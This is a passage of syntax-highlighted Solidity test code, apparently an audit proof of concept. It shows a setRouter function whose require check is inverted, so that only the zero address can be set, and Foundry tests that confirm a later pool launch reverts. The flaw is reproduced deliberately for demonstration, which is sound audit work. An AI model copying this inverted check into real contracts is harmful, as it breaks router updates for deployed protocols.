<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">launch</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_router</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk3">/*maturityTime*/</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">launchCalled</span><span class="mtk1"> = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">currentRouter</span><span class="mtk1"> = </span><span class="mtk12">_router</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">_router</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">revert</span><span class="mtk1">(</span><span class="mtk8">"Router is address(0)"</span><span class="mtk1">); </span><span class="mtk3">// Simulate failure if router is zero</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Simulate interaction with the router</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IRouter</span><span class="mtk1">(</span><span class="mtk12">_router</span><span class="mtk1">).</span><span class="mtk11">addLiquidity</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk4">false</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">,</span><span class="mtk7">0</span><span class="mtk1">,</span><span class="mtk7">0</span><span class="mtk1">,</span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">),</span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">getGenesisInfo</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">GenesisInfo</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1">) { </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">genesisInfo</span><span class="mtk1">; }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">getLiquidityPoolInfo</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">LiquidityPool</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1">) { </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">liquidityPoolInfo</span><span class="mtk1">; }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// A simplified GenesisPoolManager containing the vulnerable function</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// and a conceptual _launchPool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">SimplifiedGenesisPoolManager</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">owner</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">router</span><span class="mtk1">; </span><span class="mtk3">// The vulnerable state variable</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IBaseV1Factory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairFactory</span><span class="mtk1">; </span><span class="mtk3">// Added for _launchPool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">MATURITY_TIME</span><span class="mtk1">;     </span><span class="mtk3">// Added for _launchPool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">event</span><span class="mtk1"> </span><span class="mtk11">RouterSet</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">newRouter</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">modifier</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1">() {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1"> == </span><span class="mtk12">owner</span><span class="mtk1">, </span><span class="mtk8">"Not owner"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">constructor</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_initialRouter</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_pairFactory</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">owner</span><span class="mtk1"> = </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">router</span><span class="mtk1"> = </span><span class="mtk12">_initialRouter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory</span><span class="mtk1"> = </span><span class="mtk11">IBaseV1Factory</span><span class="mtk1">(</span><span class="mtk12">_pairFactory</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">MATURITY_TIME</span><span class="mtk1"> = </span><span class="mtk7">1</span><span class="mtk1"> </span><span class="mtk12">weeks</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// The vulnerable function</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setRouter</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_router</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_router</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ZA"</span><span class="mtk1">); </span><span class="mtk3">// The logical error</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">router</span><span class="mtk1"> = </span><span class="mtk12">_router</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">RouterSet</span><span class="mtk1">(</span><span class="mtk12">_router</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Conceptual launch pool function to demonstrate impact</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// In a real scenario, _genesisPool would be a parameter or fetched</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_launchPool</span><span class="mtk1">(</span><span class="mtk12">IGenesisPool</span><span class="mtk1"> </span><span class="mtk12">_genesisPool</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Simplified steps from the actual GenesisPoolManager._launchPool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Assume liquidityPoolInfo.pairAddress and liquidityPoolInfo.gaugeAddress are set on _genesisPool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// IBaseV1Factory(pairFactory).setGenesisStatus(IGenesisPool(_genesisPool).getLiquidityPoolInfo().pairAddress, false); // Simplified</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// IGauge(IGenesisPool(_genesisPool).getLiquidityPoolInfo().gaugeAddress).setGenesisPool(address(_genesisPool)); // Simplified</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_genesisPool</span><span class="mtk1">.</span><span class="mtk11">launch</span><span class="mtk1">(</span><span class="mtk12">router</span><span class="mtk1">, </span><span class="mtk12">MATURITY_TIME</span><span class="mtk1">); </span><span class="mtk3">// This will use the (potentially zero) router</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Public wrapper for testing _launchPool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">testLaunch</span><span class="mtk1">(</span><span class="mtk12">IGenesisPool</span><span class="mtk1"> </span><span class="mtk12">_genesisPool</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_launchPool</span><span class="mtk1">(</span><span class="mtk12">_genesisPool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">getRouter</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">router</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Mock for IBaseV1Factory</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">MockPairFactory</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">IBaseV1Factory</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setGenesisStatus</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_pair</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">status</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> {}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Dummy implementations for other functions if needed by compiler for interface</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">isPair</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">) { </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk4">false</span><span class="mtk1">; }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">getPair</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">stable</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">) { </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">); }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">createPair</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">stable</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">) { </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">); }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setGenesisPool</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_genesisPool</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> {}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// --- Test Contract ---</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">GenesisPoolManagerRouterTest</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">Test</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">SimplifiedGenesisPoolManager</span><span class="mtk1"> </span><span class="mtk12">internal</span><span class="mtk1"> </span><span class="mtk12">manager</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">MockRouter</span><span class="mtk1"> </span><span class="mtk12">internal</span><span class="mtk1"> </span><span class="mtk12">initialRouter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">MockRouter</span><span class="mtk1"> </span><span class="mtk12">internal</span><span class="mtk1"> </span><span class="mtk12">newValidRouter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">MockGenesisPool</span><span class="mtk1"> </span><span class="mtk12">internal</span><span class="mtk1"> </span><span class="mtk12">mockPool</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">MockPairFactory</span><span class="mtk1"> </span><span class="mtk12">internal</span><span class="mtk1"> </span><span class="mtk12">mockPairFactory</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">internal</span><span class="mtk1"> </span><span class="mtk12">owner</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">internal</span><span class="mtk1"> </span><span class="mtk12">nonOwner</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setUp</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">owner</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">); </span><span class="mtk3">// Test contract itself is the owner</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">nonOwner</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xBAD</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">initialRouter</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">MockRouter</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">newValidRouter</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">MockRouter</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockPool</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">MockGenesisPool</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockPairFactory</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">MockPairFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">manager</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">SimplifiedGenesisPoolManager</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">initialRouter</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">mockPairFactory</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Sanity check initial router</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertEq</span><span class="mtk1">(</span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">getRouter</span><span class="mtk1">(), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">initialRouter</span><span class="mtk1">), </span><span class="mtk8">"Initial router not set correctly"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_ownerCannotSetValidNewRouter</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">prank</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">expectRevert</span><span class="mtk1">(</span><span class="mtk8">"ZA"</span><span class="mtk1">); </span><span class="mtk3">// Expect ZA (Zero Address) error due to the faulty require</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">setRouter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">newValidRouter</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Router should remain unchanged</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertEq</span><span class="mtk1">(</span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">getRouter</span><span class="mtk1">(), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">initialRouter</span><span class="mtk1">), </span><span class="mtk8">"Router was changed when it shouldn't have been"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_ownerCanSetRouterToZeroAddress</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">prank</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">setRouter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)); </span><span class="mtk3">// This call will succeed</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertEq</span><span class="mtk1">(</span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">getRouter</span><span class="mtk1">(), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Router was not set to address(0)"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_nonOwnerCannotCallSetRouter</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">prank</span><span class="mtk1">(</span><span class="mtk12">nonOwner</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">expectRevert</span><span class="mtk1">(</span><span class="mtk8">"Not owner"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">setRouter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">newValidRouter</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">prank</span><span class="mtk1">(</span><span class="mtk12">nonOwner</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">expectRevert</span><span class="mtk1">(</span><span class="mtk8">"Not owner"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">setRouter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_launchFailsIfRouterIsZero</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// First, owner sets router to address(0)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">prank</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">setRouter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertEq</span><span class="mtk1">(</span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">getRouter</span><span class="mtk1">(), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Router setup for test failed"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Now, owner tries to launch a pool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">prank</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// The mockPool's launch function will revert if router is address(0)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Also, the call to IRouter(address(0)).addLiquidity would revert.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">expectRevert</span><span class="mtk1">(</span><span class="mtk8">"Router is address(0)"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">testLaunch</span><span class="mtk1">(</span><span class="mtk12">mockPool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
